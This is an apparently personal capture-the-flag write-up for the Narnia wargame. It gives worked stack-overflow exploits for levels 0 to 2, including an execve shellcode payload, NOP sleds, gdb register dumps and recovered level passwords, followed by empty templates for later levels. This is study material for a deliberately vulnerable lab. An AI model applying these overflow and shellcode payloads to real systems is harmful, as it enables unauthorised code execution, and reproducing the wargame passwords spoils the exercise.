# Narnia

## Generic stuff
Use peda: `source /usr/local/peda/peda.py`

## Narnia0
```
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: abcdabcdabcdabcd
buf: abcdabcdabcdabcd
val: 0x41414141
WAY OFF!!!!
```
```
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: aaaaaaaaaaaaaaaaaaaabbbb
buf: aaaaaaaaaaaaaaaaaaaabbbb
val: 0x62626262
WAY OFF!!!!
```
```
narnia0@narnia:/narnia$ ( echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde";cat;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae
```
### Narnia1 password: efeidiedae
## Narnia1
### Source code:
```
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```
### Exploit:
```
narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x90" * 50')
```
```
[----------------------------------registers-----------------------------------]
EAX: 0xffffde6d --> 0x90909090
EBX: 0x0
ECX: 0x8048542 --> 0x69470047 ('G')
EDX: 0xffffde6b --> 0x90903d47
ESI: 0x1
EDI: 0xf7fc5000 --> 0x1b2db0
EBP: 0xffffd688 --> 0x0
ESP: 0xffffd680 --> 0x80484b8 (<main+77>:       mov    eax,0x0)
EIP: 0xffffde6d --> 0x90909090
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0xffffde6d:  nop
   0xffffde6e:  nop
   0xffffde6f:  nop
   0xffffde70:  nop
[------------------------------------stack-------------------------------------]
0000| 0xffffd680 --> 0x80484b8 (<main+77>:      mov    eax,0x0)
0004| 0xffffd684 --> 0xffffde6d --> 0x90909090
0008| 0xffffd688 --> 0x0
0012| 0xffffd68c --> 0xf7e2a286 (<__libc_start_main+246>:       add    esp,0x10)
0016| 0xffffd690 --> 0x1
0020| 0xffffd694 --> 0xffffd724 --> 0xffffd854 ("/narnia/narnia1")
0024| 0xffffd698 --> 0xffffd72c --> 0xffffd864 ("LC_ALL=en_US.UTF-8")
0028| 0xffffd69c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0xffffde6d in ?? ()
gdb-peda$
```
Shell code from: `http://shell-storm.org/shellcode/files/shellcode-811.php`
```
narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
nairiepecu
$
```
### Narnia2 password: nairiepecu
## Narnia2
### Source code:
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```
### POC:
```
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x0
ECX: 0x7fffff13
EDX: 0xf7fc6870 --> 0x0
ESI: 0x2
EDI: 0xf7fc5000 --> 0x1b2db0
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd5d0 ('C' <repeats 100 times>)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd5d0 ('C' <repeats 100 times>)
0004| 0xffffd5d4 ('C' <repeats 96 times>)
0008| 0xffffd5d8 ('C' <repeats 92 times>)
0012| 0xffffd5dc ('C' <repeats 88 times>)
0016| 0xffffd5e0 ('C' <repeats 84 times>)
0020| 0xffffd5e4 ('C' <repeats 80 times>)
0024| 0xffffd5e8 ('C' <repeats 76 times>)
0028| 0xffffd5ec ('C' <repeats 72 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ set args  $(python -c 'print "A" * 132 + "B" * 4 + "C" * 100')
```
```
set args $(python -c 'print "A" * 132 + "\x90\xdd\xff\xff" + "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```
### Exploit:
```
narnia2@narnia:/narnia$ env - ./narnia2 $(python -c 'print "A" * 132 + "\x90\xdd\xff\xff" + "\x90\x90\x90\x90\x90\x90\x
90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\
xcd\x80"')
Illegal instruction
narnia2@narnia:/narnia$ env - ./narnia2 $(python -c 'print "A" * 132 + "\x90\xdd\xff\xff" + "\x90" * 30 + "\x31\xc0\x50
\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
Illegal instruction
narnia2@narnia:/narnia$ env - ./narnia2 $(python -c 'print "A" * 132 + "\x90\xdd\xff\xff" + "\x90" * 60 + "\x31\xc0\x50
\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
$ id
uid=14002(narnia2) gid=14002(narnia2) euid=14003(narnia3) groups=14002(narnia2)
$
```
Narnia3 password: `vaequeezee`
## Narnia3
### Source code:
```
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
```
### PoC:
```
```
### Exploit:
```
```
### Narnia4 password: ``
## Narnia4
### Source code:
```
```
### PoC:
```
```
### Exploit:
```
```
### Narnia5 password: ``

## Narnia5
### Source code:
```
```
### PoC:
```
```
### Exploit:
```
```
### Narnia6 password: ``

## Narnia6
### Source code:
```
```
### PoC:
```
```
### Exploit:
```
```
### Narnia7 password: ``

## Narnia7
### Source code:
```
```
### PoC:
```
```
### Exploit:
```
```
### Narnia8 password: ``

## Narnia8
### Source code:
```
```
### PoC:
```
```
### Exploit:
```
```
### Narnia9 password: ``

## Narnia9
### Source code:
```
```
### PoC:
```
```
### Exploit:
```
```
### Narnia password: ``
